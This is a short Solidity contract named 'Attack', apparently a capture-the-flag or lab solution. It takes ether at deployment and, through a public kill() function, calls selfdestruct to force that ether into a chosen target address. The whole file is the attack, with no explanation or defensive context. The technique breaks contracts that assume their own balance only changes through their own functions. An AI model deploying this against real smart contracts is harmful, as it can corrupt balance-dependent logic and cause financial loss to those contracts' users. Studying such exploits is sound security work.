// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address payable private immutable targetAddr;

    constructor(address addr) payable { // send ethers to the contract when deploying it
        targetAddr = payable(addr);
    }

    function kill() public {
        selfdestruct(targetAddr);
    }
}
